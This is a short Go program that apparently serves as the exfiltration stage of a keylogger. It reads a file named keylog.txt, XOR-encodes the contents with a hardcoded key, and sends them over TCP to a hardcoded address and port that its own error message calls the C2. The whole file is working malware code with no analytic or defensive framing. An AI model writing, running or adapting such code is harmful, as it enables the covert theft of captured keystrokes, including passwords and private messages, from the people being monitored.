package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
)

var SERVERHN = "192.168.206.161"
var READF = "keylog.txt"

func readfile() string {
	fopen, _ := os.Open(READF)
	defer fopen.Close()
	var lines string
	scanner := bufio.NewScanner(fopen) // read the file into a []string
	for scanner.Scan() {
		lines = lines + scanner.Text()
	}
	return lines
}

func getServIP() string {
	t := SERVERHN + ":33333"
	return t
}

func encrypt(input string) (output string) {
	key := "REEvurs"
	for i := 0; i < len(input); i++ {
		output += string(input[i] ^ key[i%len(key)])
	}
	return output
}

func shipIT(payload string) {
	fmt.Println("sending payload")
	sv := getServIP()
	conn, err := net.Dial("tcp4", sv)
	if err != nil {
		fmt.Println("Error connecting to the C2!")
		os.Exit(1)
	}
	conn.Write([]byte(payload))
	conn.Close()
	return
}

func main() {
	data := readfile()
	enc := encrypt(data)
	shipIT(enc)
	return
}
